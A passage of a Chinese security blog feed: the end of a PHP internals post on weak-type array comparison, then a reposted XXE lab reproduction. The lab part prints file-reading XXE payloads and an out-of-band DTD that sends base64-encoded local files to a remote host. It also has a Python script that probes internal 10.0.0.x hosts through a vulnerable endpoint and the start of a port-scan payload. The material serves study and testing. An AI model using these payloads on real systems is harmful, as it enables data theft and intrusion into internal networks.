class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define ZVAL_BOOL(z, b) do &#123;            \</span><br><span class="line">        Z_TYPE_INFO_P(z) =              \</span><br><span class="line">            (b) ? IS_TRUE : IS_FALSE;   \</span><br><span class="line">    &#125; while (0)</span><br></pre></td></tr></table></figure></p><p>换成当前的场景<br>result为z ，(Z_LVAL_P(result) &lt; 0)为b<br>z 为用于设置布尔值的zval<br>b 为 设置的布尔值</p><p><img src="https://i.imgur.com/p6nTs1r.png" alt=""></p><p>这个函数 名是is_smaller_function具体意思已经很明显了</p><p>只有 Z_LVAL_P(result) &lt; 0，当result=-1<br>（即op1&lt;op2的时候 result才为-1）<br>才会使b=1 并且使得<br>(b) ? IS_TRUE : IS_FALSE; 判断为IS_TRUE<br>并使得Z_TYPE_INFO_P(result) 为IS_TRUE，<br>最后就是根据Z_TYPE_INFO_P(result) 使IS_TRUE或者IS_FALSE来判断究竟是否小于</p><p>下一句<br><img src="https://i.imgur.com/XVUpc3Q.png" alt=""></p><p>因为两个值是可以进行比较的它会return SUCCESS，我是这么理解的<br><img src="https://i.imgur.com/2F2DLva.png" alt=""></p><p>如果有人看到这里，对于PHP究竟是如何判断大小应该有了基本的认识了吧<br>回到我们最开始的问题<br><img src="https://i.imgur.com/6isxsTs.png" alt=""><br>那么我们就应该取寻找OP1与OP2分别为array类型与IS_LONG的case<br>与OP1与OP2分别为array类型与array类型<br>当然阅读这些case的时候又冒出了个问题<br><img src="https://i.imgur.com/gvfdjFW.png" alt=""><br>这个又是什么意思呢？<br>经过查询我们可以知道这句话来源于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define Z_ISREF(zval) (Z_TYPE(zval) == IS_REFERENCE)</span><br></pre></td></tr></table></figure></p><p>其意思为<br>该zval检查它是否是一个引用类型，姑且认为是判断这个变量是否属于PHP八种变量中的一种，<br>那么IS_REFERENCE又是什么呢</p><blockquote><p>此类型用于表示a zval是PHP引用。引用的值zval需要首先解除引用才能使用它。这可以使用ZVAL_DEREF或Z_REF宏来完成。zval可以检查A 以查看它是否是Z_ISREF宏的引用。</p></blockquote><p>姑且认为这个意思是zaval确实是PHP引用的变量之一</p><p>那么整句话的我的理解是，当发生default:的时候假如OP1,OP2是PHP引用变量之一那么就继续<br>接下来的几个case都不属于我们想要的情况<br>直到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">if (!converted) &#123;</span><br><span class="line">if (Z_TYPE_P(op1) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? -1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">op1 = zendi_convert_scalar_to_number(op1, &amp;op1_copy, result, 1);</span><br><span class="line">op2 = zendi_convert_scalar_to_number(op2, &amp;op2_copy, result, 1);</span><br><span class="line">if (EG(exception)) &#123;</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">converted = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">ZEND_ASSERT(0);</span><br><span class="line">zend_throw_error(NULL, &quot;Unsupported operand types&quot;);</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为在函数的开头converted=0<br>所以!converted=1是正确的，<br>我们跟进这个判断<br>发现<br><img src="https://i.imgur.com/tFiBazU.png" alt=""><br>这边只要op1为IS_ARRAY类型的变量就result直接就为1了<br>这也解释了我们之前的问题<br><img src="https://i.imgur.com/u0eHfcF.png" alt=""><br>为什么[]无论是比较1，0，-1都是返回true<br>以及PHP手册中<br><img src="https://i.imgur.com/7LjAy1u.png" alt=""><br>中的这个问题</p><p>当然我们依旧留存下一个问题<br><img src="https://i.imgur.com/JOIPz8r.png" alt=""><br>为什么这个也是恒真的呢？<br>可以清楚看到左右两边都是数组，我们需要找到arrary与arrary的这种case<br><img src="https://i.imgur.com/3J6lBoh.png" alt=""><br>在最开始没几行就可以找到了<br>这里有一个函数zend_compare_arrays<br>我们跟进一下<br><img src="https://i.imgur.com/KqTZiGK.png" alt=""><br>我们可以看到它返回了一个zend_compare_symbol_tables函数<br>我们再跟进下<br><img src="https://i.imgur.com/CvETlAa.png" alt=""><br>当然在传入参数的时候又经历了Z_ARRVAL_P(a1)的变化<br>Z_ARRVAL_P(a1)源自</p><blockquote><p>#define Z_ARRVAL(zval) Z_ARR(zval)</p></blockquote><p>大概的含义是从数组中抓取hash值，<br><img src="https://i.imgur.com/q8PoRVR.png" alt=""><br>这里需要传入HashTable *ht1<br>那么HashTable 又是什么呢？</p><blockquote><p>在学数据结构的时候我们都有学到hash，<br>其实对于hashtable我之前的印象是比如python中的字典它的原理就是采取hash表，即采取键值对的方式进行查询数据，比起链表等方式查询无疑是要快的多</p></blockquote><p>那么这里的hashtable又是否和我想的一样呢？具体看<a href="http://www.php-internals.com/book/?p=chapt03/03-01-02-hashtable-in-php" target="_blank" rel="noopener">这里</a></p><blockquote><p>PHP内核中的哈希表是十分重要的数据结构，PHP的大部分的语言特性都是基于哈希表实现的， 例如：变量的作用域、函数表、类的属性、方法等，Zend引擎内部的很多数据都是保存在哈希表中的。</p></blockquote><blockquote><p>PHP中的哈希表实现在Zend/zend_hash.c中，先看看PHP实现中的数据结构， PHP使用如下两个数据结构来实现哈希表，HashTable结构体用于保存整个哈希表需要的基本信息， 而Bucket结构体用于保存具体的数据内容，如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _hashtable &#123; </span><br><span class="line">    uint nTableSize;        // hash Bucket的大小，最小为8，以2x增长。</span><br><span class="line">    uint nTableMask;        // nTableSize-1 ， 索引取值的优化</span><br><span class="line">    uint nNumOfElements;    // hash Bucket中当前存在的元素个数，count()函数会直接返回此值 </span><br><span class="line">    ulong nNextFreeElement; // 下一个数字索引的位置</span><br><span class="line">    Bucket *pInternalPointer;   // 当前遍历的指针（foreach比for快的原因之一）</span><br><span class="line">    Bucket *pListHead;          // 存储数组头元素指针</span><br><span class="line">    Bucket *pListTail;          // 存储数组尾元素指针</span><br><span class="line">    Bucket **arBuckets;         // 存储hash数组</span><br><span class="line">    dtor_func_t pDestructor;    // 在删除元素时执行的回调函数，用于资源的释放</span><br><span class="line">    zend_bool persistent;       //指出了Bucket内存分配的方式。如果persisient为TRUE，则使用操作系统本身的内存分配函数为Bucket分配内存，否则使用PHP的内存分配函数。</span><br><span class="line">    unsigned char nApplyCount; // 标记当前hash Bucket被递归访问的次数（防止多次递归）</span><br><span class="line">    zend_bool bApplyProtection;// 标记当前hash桶允许不允许多次访问，不允许时，最多只能递归3次</span><br><span class="line">#if ZEND_DEBUG</span><br><span class="line">    int inconsistent;</span><br><span class="line">#endif</span><br><span class="line">&#125; HashTable;</span><br></pre></td></tr></table></figure><p>当然如果要详细讲PHP中的hashtable讲清楚肯定要再写另一篇博客，这里我们就只讲这里所需要的原理<br><img src="https://i.imgur.com/oz6iVWs.png" alt=""><br>这里进行两个参数的判断，当两个参数hash值相等时候就返回0<br>我们可以直接看看php数组的hash，具体点<a href="https://www.jianshu.com/p/3f1d0f9907a1" target="_blank" rel="noopener">这里</a><br><img src="https://i.imgur.com/Dkm5Ix6.png" alt=""><br>这是在PHP5.6的数组结构<br>我们可以看到，数组本质就是一个hashtable结构，左侧的0~nTablemask便是hash下标，而后面有一个双向链表，便是我们通常所说的hash冲突的链地址法。<br><img src="https://i.imgur.com/hgjQdOQ.png" alt=""><br>这是PHP7.0的数组结构<br><img src="https://i.imgur.com/QOxDpIr.png" alt=""><br>Bucket结构便是我们所说的保存插入数据的结构。主要包括：key(字符串，如果是数字下标，转化位字符串), value, h(只会计算一次，如果是数组下标，直接把key作为h)。</p><p>稍稍回到原题，我们进行比较的就是Bucket结构中的hash值</p><p>那么hash值是怎么比较的呢？<br>我们查找zend_hash_compare函数到底是什么意思</p><blockquote><p>int zend_hash_compare(<br>    HashTable <em>ht1, HashTable </em>ht2, compare_func_t compar, zend_bool ordered TSRMLS_DC<br>);</p></blockquote><p>我们查询了hashtable的api具体想了解可以看<a href="http://www.phpinternalsbook.com/hashtables/hashtable_api.html" target="_blank" rel="noopener">这里</a><br>这里有一句话</p><blockquote><p>The return has the same meaning as compare_func_t. The function first compares the length of the arrays. If they differ, then the array with the larger length is considered greater. What happens when the length is the same depends on the ordered parameter:<br>For ordered=0 (not taking order into account) the function will walk through the buckets of the first hashtable and always look up if the second hashtable has an element with the same key. If it doesn’t, then the first hashtable is considered greater. If it does, then the compar function is invoked on the values.<br>For ordered=1 (taking order into account) both hashtables will be walked simultaneously. For each element first the key is compared and if it matches the value is compared using compar.<br>This is continued until either one of the comparisons returns a non-zero value (in which case the result of the comparison will also be the result of zend_hash_compare()) or until no more elements are available. In the latter case the hashtables are considered equal.</p></blockquote><p>解释一下<br>这里先会判断这两个数组参数的长度。如果它们不同，则认为具有较大长度的阵列更大<br>这也就能说明为什么我们前面的问题是恒真了吧<br><img src="https://i.imgur.com/9q0v10w.png" alt=""></p><p>当然当长度相同比如[7],与[6]<br><img src="https://i.imgur.com/NkRgIZm.png" alt=""><br>会遍历第一个数组，假如第一个数组的元素，并始终查找第二个哈希表是否具有相同键的元素。如果没有，那么第一个哈希表被认为更大，<br>看到这里大家的疑惑都解决了吧</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过这次探寻，我深刻发现到往往很多我们认为是常识的东西都有着很多极其复杂的原理，我们认识一件事物的时候不能仅仅只凭借表面现象就根据自己直觉来得出结论，虽然有的时候得出的结果是一样的，但是我们并不能够真正理解这个结论到底为何而来。</p><h2 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h2><p>本文由安全客原创发布<br>转载，请参考转载声明，注明出处： <a href="https://www.anquanke.com/post/id/171966" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171966</a><br>安全客 - 有思想的安全新媒体</p>]]></content>
    
    <summary type="html">
    
      在CTF比赛中PHP弱类型的特性常常被用上，但我们往往知其然不知其所以然，究竟为什么PHP是弱类型呢？很少人深究。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="PHP内核分析" scheme="https://museljh.github.io/tags/PHP%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP弱类型" scheme="https://museljh.github.io/tags/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>对于XXE漏洞的学习与实验复现记录（转载）</title>
    <link href="https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/"/>
    <id>https://museljh.github.io/2019/02/26/对于XXE漏洞的学习与实验复现记录（转载）/</id>
    <published>2019-02-26T14:37:29.000Z</published>
    <updated>2019-02-26T14:43:59.039Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>突然想研究下XXE漏洞,没有为什么，这篇作者写的挺好的，推荐可以同样学习一波。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-5</a><br><a href="http://www.runoob.com/xml/xml-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/xml/xml-tutorial.html</a></p></blockquote><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>实验来源,我只是复现学习一波</p><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-11</a></p></blockquote><p>实验场所<br>:Ubuntu 16.04.3 LTS nginx+php+mysql</p><p>实验一：有回显读本地敏感文件(Normal XXE)<br>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件<br>本地服务器上放上解析 XML 的 php 代码：<br>xml.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>我们在相同目录下放一个flag.php内容随意</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///var/www/html/test/flag.php&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ocdjRxg.png" alt=""></p><p>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利,但是假如换成以下内容呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># /etc/fstab: static file system information.</span><br><span class="line">#</span><br><span class="line"># Use &apos;blkid&apos; to print the universally unique identifier for a</span><br><span class="line"># device; this may be used with UUID= as a more robust way to name devices</span><br><span class="line"># that works even if disks are added and removed. See fstab(5).</span><br><span class="line">#</span><br><span class="line"># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span><br><span class="line"># / was on /dev/vda1 during installation</span><br><span class="line">UUID=e2048966-750b-4795-a9a2-7b477d6681bf /               ext4    errors=remount-ro 0       1</span><br><span class="line">/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0</span><br></pre></td></tr></table></figure></p><p>/etc/fstab 文件所表达的意义</p><blockquote><p><a href="https://blog.51cto.com/lspgyy/1297432" target="_blank" rel="noopener">https://blog.51cto.com/lspgyy/1297432</a></p></blockquote><p>再次读取<br><img src="https://i.imgur.com/kL15Xbc.png" alt=""></p><p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下(引用自转载大佬的一片介绍 XML 的博客)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者</span><br><span class="line">&quot; 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</span><br><span class="line"></span><br><span class="line">&lt;![CDATA[</span><br><span class="line"></span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">]]&gt;</span><br><span class="line"></span><br><span class="line">可以输入任意字符除了 ]]&gt; 不能嵌套</span><br><span class="line"></span><br><span class="line">用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</span><br></pre></td></tr></table></figure></p><p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p><p>首先，找到问题出现的地方，问题出现在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></p><p>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “\&lt;![CDATA[“和 “]]>”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法<br>那么要想在 DTD<br>中拼接，我们知道我们只有一种选择，就是使用 参数实体<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/SEFtSfe.png" alt=""><br>成功读取</p><p>这里dtd引用时，需要查看下php.ini文件<br>allow_url_fopen必须时on，<br><img src="https://i.imgur.com/lpv7uUG.png" alt=""><br>因为这个off我试了半天不行<br><img src="https://i.imgur.com/nRx3t2s.png" alt=""><br>新的问题出现<br>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p><p>实验二：无回显读取本地敏感文件(Blind OOB XXE)<br>xml.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>test.dtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p><p>(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;否则这里会有个错误）<br><img src="https://i.imgur.com/FqJUWzE.png" alt=""><br>修改后<br><img src="https://i.imgur.com/zBn1LKt.png" alt=""><br>我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。<br>整个调用过程：<br>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。<br>新的思考：<br>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。<br>新的利用：<br>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议<br>如图所示:<br><img src="https://i.imgur.com/wx7OTbH.png" alt=""><br>PHP在安装扩展以后还能支持的协议：<br>如图所示：<br><img src="https://i.imgur.com/zgFKDpG.png" alt=""><br>实验三：HTTP 内网主机探测<br>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了<br>下面是一个探测脚本的实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line">#&lt;xml&gt;</span><br><span class="line">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class="line">#&lt;/xml&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &apos;&quot;&apos; + string + &apos;&quot;&apos; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers = &#123;&apos;Content-Type&apos;: &apos;application/xml&apos;&#125;</span><br><span class="line">    x = requests.post(&apos;http://34.200.157.128/CUSTOM/NEW_XEE.php&apos;, data=xml, headers=headers, timeout=5).text</span><br><span class="line">    coded_string = x.split(&apos; &apos;)[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = &apos;10.0.0.&apos; + i</span><br><span class="line">        string = &apos;php://filter/convert.base64-encode/resource=http://&apos; + ip + &apos;/&apos;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/sMX0pMB.png" alt=""><br>实验四：HTTP 内网主机端口扫描<br>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测<br>比如我们传入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure></p><p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 